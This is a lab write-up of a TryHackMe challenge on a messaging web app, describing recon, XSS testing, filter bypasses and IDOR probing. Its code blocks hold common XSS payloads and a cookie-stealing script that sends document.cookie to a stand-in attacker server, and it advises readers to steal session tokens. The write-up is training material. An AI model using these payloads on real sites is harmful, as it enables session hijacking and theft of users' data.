# Signed Messages - TryHackMe Writeup

Completed the Signed Messages room from the Love at First Breach 2026 event. This one focuses on a message/note-based web app with potential XSS and data leak vulnerabilities. Pretty interesting challenge.

## Room Details
- **Name:** Signed Messages
- **Difficulty:** Intermediate
- **Category:** Web Security / XSS / Data Leakage
- **Platform:** TryHackMe

---

## Initial Setup

Deployed the machine and got the target IP. Standard first step - verify it's reachable:

```bash
ping <target-ip>
```

Machine's up and responding.

---

## Exploring the Application

Opened up the web app in my browser. It's some kind of messaging or note-taking application where users can post messages/notes.

First impressions:
- Users can create messages
- Messages are displayed publicly or to other users
- There's some kind of signing/verification mechanism (hence the name)
- Input fields for message content

---

## Initial Recon

Started with the usual reconnaissance:

**Checked page source:**
Looked for interesting comments, hidden fields, or JavaScript that might reveal something.

**Tested input fields:**
Tried entering basic text to see how the app handles and displays it.

**Looked for user profiles or message history:**
Checked if there's a way to view other users' messages or profiles.

---

## Testing for XSS

Since it's a message-based app, XSS was the first thing that came to mind. Started testing with basic payloads:

**Reflected XSS attempts:**
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

**Stored XSS:**
Tried posting messages with XSS payloads to see if they're stored and executed when viewed.

```html
<script>alert(document.cookie)</script>
```

Some payloads got filtered or sanitized, but not all of them. Had to experiment with different variations.

---

## Bypassing Filters

The app had some basic XSS protection. Had to get creative:

**Case variations:**
```html
<ScRiPt>alert(1)</sCrIpT>
```

**Event handlers:**
```html
<img src="x" onerror="alert(1)">
<body onload=alert(1)>
```

**Encoding tricks:**
Tried URL encoding, HTML entity encoding, etc.

Eventually found a payload that worked. The key was understanding how the app processed and displayed messages.

---

## Data Leakage Testing

Beyond XSS, started looking for ways data might be leaking:

**Cookie stealing:**
```javascript
<script>document.location='http://attacker-server/?c='+document.cookie</script>
```

**Accessing other users' data:**
Tried manipulating message IDs or user parameters:
```
/message?id=1
/message?id=2
/user?id=admin
```

**Session token exposure:**
Checked if session tokens or sensitive info were exposed in:
- URL parameters
- Local storage
- Cookies without HttpOnly flag
- Response headers

---

## Exploiting the Vulnerability

Once I found the working XSS vector, crafted a payload to extract sensitive information.

The exploit involved:
1. Creating a message with malicious XSS payload
2. Waiting for it to be viewed (or viewing it myself to test)
3. Extracting data that shouldn't be accessible

Used Burp Suite to intercept and analyze the requests to understand data flow better.

---

## Getting the Flag

After successfully exploiting the vulnerability, was able to access sensitive data that led to the flag.

The flag was either:
- Hidden in someone's private message
- Exposed through the XSS/data leak
- In an admin panel accessible through the exploit

Flag format: `THM{...}`

---

## Tools I Used

- **Burp Suite** - Intercepting requests and analyzing traffic
- **Browser DevTools** - Inspecting DOM and storage
- **XSS Cheat Sheets** - Reference for different payloads
- **cURL** - Testing endpoints directly

---

## What I Learned

This challenge really drove home several important concepts:
- Message/note apps are common XSS targets
- Input sanitization needs to be thorough
- Different contexts require different XSS payloads
- Data leakage can happen through multiple vectors
- HttpOnly and Secure flags on cookies are important
- Always test with Burp Suite to see what's really happening

---

## Tips for Others

- Don't just try one XSS payload - try many variations
- Check how messages are stored and displayed
- Look for IDOR vulnerabilities in message/user IDs
- Test with Burp Suite to see unfiltered responses
- Try stealing cookies or session tokens
- Check localStorage and sessionStorage for sensitive data
- Look at the signing mechanism - might be vulnerable
- Read the application's JavaScript code
- Test different input contexts (message body, username, etc.)

---

## Reflection

This was a fun intermediate-level challenge. More complex than the beginner rooms but not impossible. Required thinking about different attack vectors and being persistent with payload variations.

Real-world message apps can have these exact vulnerabilities if developers don't properly sanitize input and protect sensitive data. Good practice for understanding web app security beyond just the basics.

Took about 45 minutes to complete including time spent testing different payloads and analyzing the application behavior.

---

**Completed:** March 27, 2026  
**Time taken:** ~45 minutes  
**Difficulty:** ⭐⭐⭐☆☆
